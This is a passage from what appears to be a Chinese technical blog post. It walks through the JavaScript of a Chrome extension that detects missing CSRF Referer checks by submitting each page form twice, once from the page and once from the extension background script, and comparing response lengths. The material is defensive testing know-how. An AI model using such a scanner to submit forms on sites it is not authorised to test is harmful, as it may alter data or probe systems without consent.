&lt;p&gt;当action地址的第一个值是&lt;code&gt;/&lt;/code&gt;时，使用&lt;code&gt;location.origin + actionCache;&lt;/code&gt;来进行拼接&lt;/p&gt;
&lt;p&gt;当action地址的第一个值是&lt;code&gt;.&lt;/code&gt;时：&lt;br&gt;先使用indexOf函数来把参数赋值给一个变量并去除，&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + actionCache.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionCache = actionCache.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;详细的情况如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后根据有无后缀进行匹配：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionPath = location.href + actionCache.substr(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache.substring(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;location.href.split(&amp;quot;/&amp;quot;).pop().split(&amp;quot;.&amp;quot;).length&lt;/code&gt;是检测&lt;code&gt;当前url&lt;/code&gt;有无后缀，如果有那么长度是为2.如果没有后缀长度是1。如果没有参数，将不会加任何字符串，因为在初始变量的时候就已经设为空了。详情如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;除去这些之外，还有直接是文件名或者直接是url，这里呢，我直接写到switch的default分之上去了，因为无法使用&lt;code&gt;actionCache[0]&lt;/code&gt;来匹配，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;http:&quot;&lt;/span&gt; || location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;https:&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href + &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先是判断&lt;code&gt;location.protocol&lt;/code&gt;是否为http或https协议。如果是的话，直接使用&lt;code&gt;location.href;&lt;/code&gt;。当不为&lt;a href=&quot;http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath&lt;/a&gt; = location.href + “/“ + actionCache;`，反馈如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当存在后缀时，运行：&lt;code&gt;actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&amp;quot;/&amp;quot;).pop())) + actionCache;&lt;/code&gt;。反馈如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x04：模拟form的参数&quot;&gt;&lt;a href=&quot;#0x04：模拟form的参数&quot; class=&quot;headerlink&quot; title=&quot;0x04：模拟form的参数&quot;&gt;&lt;/a&gt;0x04：模拟form的参数&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; v = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;v &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;v++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; input = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(v);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(input.val() == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ajaxParameter += input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) + &lt;span class=&quot;string&quot;&gt;&quot;=&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;15874583485&amp;amp;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ajaxParameter += input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) + &lt;span class=&quot;string&quot;&gt;&quot;=&quot;&lt;/span&gt; + input.val() + &lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ajaxParameter = ajaxParameter.substring(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,ajaxParameter.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用for循环对当前form表单下属性为text的input标签，然后使用&lt;code&gt;var input = formDom.find(&amp;quot;:text&amp;quot;).eq(v);&lt;/code&gt;来进行赋值，把当前的input赋值给input变量。&lt;/p&gt;
&lt;p&gt;再使用if判断，当前的input标签是否存在name属性，如果没有，则使用&lt;code&gt;continue;&lt;/code&gt;跳出初始化表达式变量为v的本次循环。如果存在，再判断当前的input的value属性里是否有值，如果有值则直接赋值给ajaxParameter。代码：&lt;code&gt;ajaxParameter += input.attr(&amp;quot;name&amp;quot;) + &amp;quot;=&amp;quot; + input.val() + &amp;quot;&amp;amp;&amp;quot;;&lt;/code&gt;，如果不存在则把&lt;code&gt;15874583485&lt;/code&gt;赋值给ajaxParameter变量，为什么要使用类似于手机号码的呢，因为容错率挺高的。可以看到我在每次赋值的时候，都会在后面加上&amp;amp;字符。因为方便下面发送ajax。当然需要去掉最后一个&amp;amp;。于是乎，有了下面的代码：&lt;code&gt;ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1);&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&quot;0x04：与插件的background-js进行通信&quot;&gt;&lt;a href=&quot;#0x04：与插件的background-js进行通信&quot; class=&quot;headerlink&quot; title=&quot;0x04：与插件的background.js进行通信&quot;&gt;&lt;/a&gt;0x04：与插件的background.js进行通信&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;这里呢，我先说说“检测Referer的思路”，在当前网站发送一次ajax请求，Referer的地址肯定是当前的URL，是正常的，和普通提交form表单是一样的，这里呢，把action地址和method值及参数传给插件，在插件里再发送一次AJAX请求，chrome插件发送AJAX时，Refere是为空的。两次提交，如果存在Referer检测，那么返回的结果长度肯定是不一样的，如果不存在Referer检测，长度是一样的（当然可能存在个别的差异，因为可能要显示时间等，结果长度不一样，但是是不存在“Referer检测”的，下面会增加容错率）&lt;/p&gt;
&lt;p&gt;Chrome对插件通信提供了发送&lt;code&gt;chrome.runtime.sendMessage&lt;/code&gt;和接受&lt;code&gt;chrome.runtime.onMessage.addListener&lt;/code&gt;的API。&lt;br&gt;首先让我们来看看base.js文件里的发送&lt;code&gt;chrome.runtime.sendMessage&lt;/code&gt;API代码:&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    url: actionPath,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    type: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;post&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dataType: &lt;span class=&quot;string&quot;&gt;&#39;html&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    data: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.done(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; firstAjax = data.length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formCache = formDom;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chrome.runtime.sendMessage(&amp;#123;action: actionPath, parameter: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter&amp;#125;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;response&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为form的method属性的值是不确定的。所以就需要对ajax的参数type进行设置：&lt;code&gt;(formDom.attr(&amp;quot;method&amp;quot;) == undefined) || (formDom.attr(&amp;quot;method&amp;quot;) == &amp;#39;get&amp;#39;)?&amp;#39;get&amp;#39;:&amp;#39;post&amp;#39;&lt;/code&gt;，这里使用了三目运算符。当method的值不存在、为get的时候，type为get。当存在的时候，则为post。&lt;/p&gt;
&lt;p&gt;下面的data参数同理。只不过没有了get、post选项。改为&lt;code&gt;&amp;#39;&amp;#39;:ajaxParameter&lt;/code&gt;。因为method值为get时，参数是附在actionPath变量里的。当为post的时候，将把之前拼接的参数传给data参数。这里计算一下返回页面的长度&lt;code&gt;var firstAjax = data.length;&lt;/code&gt;，至于下面的为什么要给变量再赋值一次呢，我也不知道，可能下面的Chrome API的作用域不同，导致在下面使用API的时候，使用formDom变量，结果不对。只能重新赋值给formCache变量，这个时候API才算正常。&lt;/p&gt;
&lt;p&gt;下面就是Chrome的API了：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.sendMessage(&amp;#123;action: actionPath, parameter: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter&amp;#125;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;response&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的action和parameter是发送的参数及值。至于代码&lt;code&gt;(formDom.attr(&amp;quot;method&amp;quot;) == undefined) || (formDom.attr(&amp;quot;method&amp;quot;) == &amp;#39;get&amp;#39;)?&amp;#39;&amp;#39;:ajaxParameter&lt;/code&gt;和上面同理，当为get的时候，不给parameter值，当为post的时候，值为ajaxParameter。&lt;code&gt;response&lt;/code&gt;为回调函数，类似ajax的done函数，返回background.js的处理结果。&lt;/p&gt;
&lt;p&gt;那background.js是如何处理的呢：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.onMessage.addListener(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;message,sender,sendResponse&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        url: message.action,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        type: (message.parameter == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;post&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dataType: &lt;span class=&quot;string&quot;&gt;&#39;html&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        data: (message.parameter == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:message.parameter,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .done(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sendResponse(&amp;#123;status: data.length&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span 